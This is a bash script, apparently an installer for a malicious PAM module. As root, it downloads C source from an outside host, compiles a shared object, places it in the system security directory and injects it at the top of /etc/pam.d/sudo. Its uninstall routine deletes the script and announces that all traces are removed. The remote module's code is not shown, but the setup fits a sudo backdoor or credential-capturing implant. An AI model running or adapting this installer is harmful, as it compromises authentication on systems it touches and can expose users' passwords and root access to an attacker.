#!/bin/bash

PAM_NAME="pam_1999.so"
PAM_SRC="pam_1999.c"
PAM_O="pam_1999.o"
REMOTE_SRC="https://file.0x1999.tech/loog/pam_1999.c"

SCRIPT_NAME="$(basename "$0")"
PAM_DIR="/lib/x86_64-linux-gnu/security"
[ -d "$PAM_DIR" ] || PAM_DIR="/lib64/security"

TARGET_FILES=("/etc/pam.d/sudo")

# Wajib root
if [ "$EUID" -ne 0 ]; then
  echo "[!] Please run this script as root using: sudo su -"
  exit 1
fi

function fetch_remote_c() {
    echo "[+] Downloading $PAM_SRC from $REMOTE_SRC ..."
    if command -v curl > /dev/null; then
        curl -fsSL "$REMOTE_SRC" -o "$PAM_SRC" || { echo "[-] Failed to fetch file via curl"; exit 1; }
    elif command -v wget > /dev/null; then
        wget -q "$REMOTE_SRC" -O "$PAM_SRC" || { echo "[-] Failed to fetch file via wget"; exit 1; }
    else
        echo "[-] Neither curl nor wget is installed"
        exit 1
    fi
}

function compile_pam() {
    echo "[+] Compiling $PAM_NAME ..."
    gcc -fPIC -fno-stack-protector -c "$PAM_SRC" -o "$PAM_O" || { echo "[-] Compile failed"; exit 1; }
    ld -x --shared -o "$PAM_NAME" "$PAM_O"
}

function clean_local_files() {
    echo "[+] Cleaning build artifacts ..."
    rm -f "$PAM_O" "$PAM_NAME"
}

function install_pam() {
    fetch_remote_c
    compile_pam
    echo "[+] Copying $PAM_NAME to $PAM_DIR ..."
    cp "$PAM_NAME" "$PAM_DIR"
    chmod 644 "$PAM_DIR/$PAM_NAME"

    for file in "${TARGET_FILES[@]}"; do
        if ! grep -q "$PAM_NAME" "$file"; then
            echo "[+] Injecting into $file"
            sed -i "1i auth required $PAM_NAME" "$file"
        else
            echo "[*] Already injected in $file"
        fi
    done

    clean_local_files
    echo "[✓] Installed and active for sudo only."
}

function uninstall_pam() {
    echo "[+] Removing PAM config entries ..."
    for file in "${TARGET_FILES[@]}"; do
        sed -i "/$PAM_NAME/d" "$file"
    done

    echo "[+] Removing $PAM_NAME from $PAM_DIR"
    rm -f "$PAM_DIR/$PAM_NAME"

    echo "[+] Deleting source files and script..."
    rm -f "$PAM_SRC" "$PAM_O" "$PAM_NAME" "$SCRIPT_NAME"

    echo "[✓] All traces removed. Uninstall complete."
}

function check_status() {
    echo "[*] Checking status of $PAM_NAME ..."
    FOUND=0
    for file in "${TARGET_FILES[@]}"; do
        if grep -q "$PAM_NAME" "$file"; then
            echo "  - FOUND in $file"
            FOUND=1
        fi
    done
    if [ -f "$PAM_DIR/$PAM_NAME" ]; then
        echo "  - Binary exists: $PAM_DIR/$PAM_NAME"
        FOUND=1
    fi
    if [ "$FOUND" -eq 0 ]; then
        echo "[-] $PAM_NAME is NOT installed."
    else
        echo "[✓] $PAM_NAME is active."
    fi
}

function help_menu() {
    echo "Usage: $0 [install | uninstall | status]"
}

case "$1" in
    install) install_pam ;;
    uninstall) uninstall_pam ;;
    status) check_status ;;
    *) help_menu ;;
esac
